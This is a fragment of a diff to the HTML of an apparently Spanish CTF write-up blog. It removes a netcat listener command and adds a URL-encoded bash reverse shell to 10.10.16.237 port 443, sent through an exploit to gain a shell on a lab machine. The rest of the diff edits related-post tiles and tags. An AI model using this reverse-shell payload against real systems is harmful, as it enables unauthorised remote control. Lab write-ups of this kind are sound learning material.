-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc -nlvp 443
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Nos esperamos un rato y ya somos root</p>
+</div><p>Ahora enviamos con el exploit el comando para mandarnos una revershell <code>bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.237%2F443%200%3E%261%22</code>.</p>
 
 </section>
 
@@ -801,8 +537,6 @@ if (!doNotTrack) {
             <a href="/tags/f%C3%A1cil/">Fácil</a>
         
             <a href="/tags/linux/">Linux</a>
-        
-            <a href="/tags/crontab/">crontab</a>
         
     </section>
 
@@ -821,25 +555,6 @@ if (!doNotTrack) {
     <h2 class="section-title">Contenidos relacionados</h2>
     <div class="related-content">
         <div class="flex article-list--tile">
-            
-                
-<article class="has-image">
-    <a href="/p/resoluci%C3%B3n-source/">
-        
-        
-            <div class="article-image">
-                
-                    <img src="/images/portada.png" loading="lazy" data-key="" data-hash="/images/portada.png"/>
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">Resolución Source</h2>
-        </div>
-    </a>
-</article>
-
             
                 
 <article class="has-image">
@@ -908,6 +623,30 @@ if (!doNotTrack) {
 
         <div class="article-details">
             <h2 class="article-title">Resolución Bounty Hacker</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/resoluci%C3%B3n-overpass/">
+        
+        
+            <div class="article-image">
+                <img src="/p/resoluci%C3%B3n-overpass/images/portada.5dbbd86e8c5dc982a5dd1228e4b03e41.png" 
+                        width="1914" 
+                        height="874" 
+                        loading="lazy"
+                        alt="Featured image of post Resolución Overpass"
+                        
+                        data-hash="md5-XbvYboxdyYKl3RIo5LA&#43;QQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Resolución Overpass</h2>
         </div>
     </a>
 </article>
